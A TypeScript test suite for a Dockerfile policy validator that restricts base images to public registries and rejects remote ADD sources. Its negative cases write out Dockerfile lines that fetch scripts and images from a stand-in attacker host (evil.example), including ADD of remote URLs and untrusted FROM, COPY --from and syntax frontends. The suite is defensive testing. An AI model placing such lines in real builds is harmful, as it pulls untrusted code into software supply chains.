import { mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import {
  checkBuildContextDockerfile,
  checkDockerfile,
  imageRegistry,
  isPublicRegistryImage,
} from "../src/buildmodes/dockerfilePolicy.js";

const problems = (t: string) => {
  const r = checkDockerfile(t);
  return r.ok ? [] : r.problems;
};

describe("image registries", () => {
  it.each([
    ["node:20", "docker.io"],
    ["library/node:20", "docker.io"],
    ["bitnami/nginx", "docker.io"],
    ["docker.io/library/node", "docker.io"],
    ["ghcr.io/owner/app:1", "ghcr.io"],
    ["localhost/x", "localhost"],
    ["evil.example:5000/x", "evil.example:5000"],
    ["GHCR.IO/x", "ghcr.io"],
  ])("%s pulls from %s", (ref, reg) => {
    expect(imageRegistry(ref)).toBe(reg);
  });

  it("allows exactly the public registries", () => {
    for (const ok of [
      "node:20-alpine",
      "index.docker.io/library/node",
      "ghcr.io/a/b",
      "quay.io/a/b",
      "mcr.microsoft.com/dotnet/sdk:8.0",
      "public.ecr.aws/docker/library/node",
      "gcr.io/distroless/static",
      "node@sha256:0123",
    ]) expect(isPublicRegistryImage(ok)).toBe(true);
    for (const bad of ["evil.example/x", "ghcr.io:443/x", "registry.gitlab.com/x/y", "localhost:5000/x", "us.gcr.io.evil.com/x"]) {
      expect(isPublicRegistryImage(bad)).toBe(false);
    }
  });
});

describe("checkDockerfile", () => {
  it("accepts an ordinary multi-stage build", () => {
    expect(
      problems(`# syntax=docker/dockerfile:1
ARG NODE=20
FROM --platform=$BUILDPLATFORM node:\${NODE}-alpine AS build
WORKDIR /app
COPY package*.json ./
RUN npm ci
COPY . .
RUN npm run build

FROM gcr.io/distroless/nodejs20 AS run
COPY --from=build /app/dist /app
COPY --from=0 /app/package.json /app/
ADD ./static /static
ADD --chown=1000 vendor.tar.gz /opt/
CMD ["/app/index.js"]
`),
    ).toEqual([]);
  });

  it("rejects ADD <url> in every spelling", () => {
    for (const line of [
      "ADD https://evil.example/x.sh /x.sh",
      "add http://evil.example/x /x",
      "ADD --checksum=sha256:abc https://evil.example/x /x",
      'ADD ["https://evil.example/x", "/x"]',
      "ADD git@github.com:me/repo.git /src",
      "ADD https://github.com/me/repo.git#main /src",
      'ADD "https://evil.example/x" /x',
      "ADD ./ok https://evil.example/x /dir/",
    ]) {
      const p = problems(`FROM node:20\n${line}\n`);
      expect(p.length, line).toBe(1);
      expect(p[0]).toMatch(/^line 2: ADD .*RUN step/);
    }
  });

  it("follows line continuations and reports the instruction's first line", () => {
    const p = problems("FROM node:20\nRUN echo hi\nADD \\\n  # a comment\n\n  https://evil.example/x \\\n  /x\n");
    expect(p).toHaveLength(1);
    expect(p[0]).toMatch(/^line 3:/);
  });

  it("honours the escape directive", () => {
    expect(problems("# escape=`\nFROM node:20\nADD `\n  https://evil.example/x /x\n")).toHaveLength(1);
  });

  it("rejects images outside the public registries", () => {
    expect(problems("FROM evil.example/base\n")[0]).toMatch(/FROM image evil\.example\/base is not on a public registry/);
    expect(problems("FROM node:20 AS a\nCOPY --from=evil.example/tools:1 /bin/x /x\n")[0]).toMatch(/COPY --from image/);
    expect(problems("FROM node:20\nRUN --mount=type=bind,from=evil.example/x,target=/m true\n")[0]).toMatch(/RUN --mount from image/);
    expect(problems("# syntax=evil.example/frontend\nFROM node:20\n")[0]).toMatch(/syntax/);
  });

  it("resolves ARG defaults, and refuses an image it can't resolve", () => {
    expect(problems("ARG BASE=evil.example/x\nFROM $BASE\n")[0]).toMatch(/evil\.example\/x/);
    expect(problems("ARG BASE=node:20\nFROM ${BASE}\n")).toEqual([]);
    expect(problems("FROM ${BASE:-node:20}\n")).toEqual([]);
    expect(problems("ARG BASE\nFROM $BASE\n")[0]).toMatch(/no ARG default/);
    expect(problems("FROM node:20\nARG TOOLS=evil.example/t\nCOPY --from=$TOOLS /x /x\n")[0]).toMatch(/evil\.example\/t/);
  });

  it("an earlier stage name is not an image", () => {
    expect(problems("FROM node:20 AS Builder\nFROM builder\nCOPY --from=BUILDER /a /a\n")).toEqual([]);
  });

  it("flags ONBUILD ADD <url>", () => {
    expect(problems("FROM node:20\nONBUILD ADD https://evil.example/x /x\n")).toHaveLength(1);
  });

  it("reads the context's Dockerfile, falling back to dockerfile", async () => {
    const dir = mkdtempSync(join(tmpdir(), "dfp-"));
    expect(await checkBuildContextDockerfile(dir)).toBeNull();
    writeFileSync(join(dir, "dockerfile"), "FROM evil.example/x\n");
    expect((await checkBuildContextDockerfile(dir))?.ok).toBe(false);
    writeFileSync(join(dir, "Dockerfile"), "FROM node:20\n");
    expect((await checkBuildContextDockerfile(dir))?.ok).toBe(true);
  });
});

describe("the validate build tool", () => {
  it("reports Dockerfile policy problems alongside the manifest check", async () => {
    const { BuildToolHost } = await import("../src/buildmodes/buildToolHost.js");
    const { BuildWorkspace } = await import("../src/buildmodes/buildWorkspace.js");
    const { InMemoryBuildJournal } = await import("../src/buildmodes/buildJournal.js");
    const manifest = JSON.stringify({ schema_version: 1, name: "x", version: "0.1.0", runtime: { image: "flagship/x:0.1.0", port: 8080 } });
    const host = (dockerfile: string) =>
      new BuildToolHost({
        buildId: "b1",
        workspace: new BuildWorkspace({ "flagship.app.json": manifest, Dockerfile: dockerfile }),
        journal: new InMemoryBuildJournal(),
        serverFqdn: "home.harry.flagship.services",
        envNames: async () => [],
      });
    const bad = JSON.parse((await host("FROM evil.example/base\nADD https://evil.example/x /x\n").call("validate", {})).text);
    expect(bad.ok).toBe(false);
    expect(bad.problems).toHaveLength(2);
    const good = JSON.parse((await host("FROM node:20-alpine\nCOPY . .\n").call("validate", {})).text);
    expect(good).toMatchObject({ ok: true, problems: [] });
  });
});
